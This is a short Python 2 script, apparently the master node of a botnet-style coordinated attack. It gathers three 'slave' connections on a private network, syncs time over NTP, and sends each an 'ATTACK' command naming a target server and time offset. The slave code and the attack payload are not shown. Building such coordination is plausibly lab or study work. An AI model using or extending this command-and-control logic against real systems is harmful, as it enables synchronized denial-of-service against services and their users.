import time, datetime, sys, re,ntplib
from socket import *  #importing the socket library for network connections
from time import ctime

##Setting up variables
SERVER_HOST = '10.1.1.50'
SERVER_PORT = 8080
MS_LISTEN_HOST = '10.1.1.20'
MS_LISTEN_PORT = 8081

class Master():
  def __init__(self, sock=None):
    if sock is None:
      self.sock = socket(AF_INET, SOCK_STREAM)
    else:
      self.sock = sock
    self.slaves = {}

    # The server to be attacked
    self.server_ip = SERVER_HOST
    self.server_port = SERVER_PORT

    # get ntp times
    self.ntpc = ntplib.NTPClient()
    self.ntp_res = self.ntpc.request('10.1.1.50', version=3)

  def listenConnections(self, port):
    print "Listening for connections"
    self.sock.bind((MS_LISTEN_HOST, port))
    self.sock.listen(3)

  def acceptConnections(self):
    conn, addr = self.sock.accept()
    print('Accepting connection {0}'.format(addr))
    print('Conn is {0}'.format(conn))
    msg_buf = conn.recv(64)
    if len(msg_buf) > 0:
      print(msg_buf)
    conn.send('Master offset is: {0}'.format(self.ntp_res.offset))
    self.slaves[addr] = conn

  def launchAttack(self):
    # get ntp times
    ntpc = ntplib.NTPClient()
    for slave_addr, conn in self.slaves.iteritems():
      ntp_res = ntpc.request('10.1.1.50', version=3)
      print ctime(ntp_res.tx_time)
      conn.send('ATTACK {0} {1} {2}'.format(self.server_ip, self.server_port, ntp_res.offset))

  def closeConnection(self):
    self.sock.close()

if __name__ == '__main__':
    port = MS_LISTEN_PORT
    masterServer = Master()
    masterServer.listenConnections(port)
    while 1:
      masterServer.acceptConnections()
      if len(masterServer.slaves) >= 3:
        break
    masterServer.launchAttack()
    masterServer.closeConnection()
